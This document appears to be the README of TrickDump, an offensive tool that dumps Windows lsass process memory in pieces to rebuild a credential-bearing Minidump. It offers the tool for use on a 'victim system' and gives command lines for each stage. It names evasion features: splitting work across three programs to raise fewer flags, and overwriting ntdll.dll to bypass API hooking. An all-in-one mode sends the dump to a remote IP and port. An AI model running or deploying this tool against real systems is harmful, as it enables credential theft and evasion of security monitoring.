# TrickDump

TrickDump dumps the lsass process without creating a Minidump file, generating instead 3 JSON and 1 ZIP file with the memory region dumps. In three steps:

- **Lock**: Get OS information using RtlGetVersion.

- **Shock**: Get SeDebugPrivilege privilege with NtOpenProcessToken and NtAdjustPrivilegeToken, open a handle with NtGetNextProcess and NtQueryInformationProcess and then get modules information using NtQueryInformationProcess and NtReadVirtualMemory.

- **Barrel**: Get SeDebugPrivilege privilege, open a handle and then get information and dump memory regions using NtQueryVirtualMemory and NtReadVirtualMemory. 


![img](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/trickdump.drawio.png)


In the attack system, use the *create_dump.py* script to generate the Minidump file:

```
python3 create_dump.py [-l LOCK_JSON] [-s SHOCK_JSON] [-b BARREL_JSON] [-z BARREL_ZIP] [-o OUTPUT_FILE] 
```

The benefits of this technique are:

- There is never a valid Minidump file in disk, memory or the network traffic.

- There is not a single program or process executing the whole attack but three separate ones, which may raise less flags.
  - If you prefer to run only one program you can use [Trick](#all-in-one).
  - If you already have information about the OS of the target machine you can skip the first step ("Lock").
  

- The programs only use NTAPIS (this project is a variant of [NativeDump](https://github.com/ricardojoserf/NativeDump)).

- It does not use OpenProcess or NtOpenProcess to get the lsass process handle with the *PROCESS_VM_OPERATION* and *PROCESS_VM_WRITE* access rights.
    
- Each program allows to overwrite the ntdll.dll library ".text" section to bypass API hooking:
  - "disk": Using a DLL already on disk. If a second argument is not used the path is "C:\Windows\System32\ntdll.dll".
  - "knowndlls": Using the KnownDlls folder.
  - "debugproc": Using a process created in debug mode. If a second argument is not used the process is "c:\windows\system32\calc.exe".

It comes in five flavours:

- .NET: The main branch
- Python: The [python-flavour branch](https://github.com/ricardojoserf/TrickDump/tree/python-flavour)
- Golang: The [golang-flavour branch](https://github.com/ricardojoserf/TrickDump/tree/golang-flavour)
- C/C++:  The [c-flavour branch](https://github.com/ricardojoserf/TrickDump/tree/c-flavour)
- BOF files: The [bof-flavour branch](https://github.com/ricardojoserf/TrickDump/tree/bof-flavour)


It will not work if PPL is enabled, ~~the PEB structure is unreadable~~ or the binaries are not compiled as 64-bit. **Update**: Now it is possible to execute the programs without reading the PEB, check the [peb-unreadable branch](https://github.com/ricardojoserf/TrickDump/tree/peb-unreadable) :)



-------------------------

## Usage

The programs are executed in the victim system, creating three JSON files (with memory regions information) and one zip file (with each memory region dump).

```
Lock.exe [disk/knowndlls/debugproc]
```

```
Shock.exe [disk/knowndlls/debugproc]
```

```
Barrel.exe [disk/knowndlls/debugproc]
```
You can execute the programs directly without overwriting the ntdll.dll library:

![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_1.png)

Or use one of the three different overwrite techniques:

![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_2.png)

Then the Minidump file is generated:

![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_3.png)

-------------------------

## All in one

If you prefer to execute only one binary, Trick.exe generates a ZIP file containing the 3 JSON files and the ZIP file with the memory regions:

```
Trick.exe [disk/knowndlls/debugproc] [IP_ADDRESS] [PORT]
```

You can create the ZIP file locally, optionally using a Ntdll overwrite method:

![img5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_5.png)

Or send it to a remote port using the second and third parameter as the IP address and the port:

![img6](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_6.png)

In both cases you get a ZIP file like this, unzip it and create the Minidump file:

![img7](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_7.png)


----------------------------------

## ⭐ Support This Project by Starring the Repository!

If you find this project helpful or interesting, please consider giving it a star 🌟 on GitHub! :)
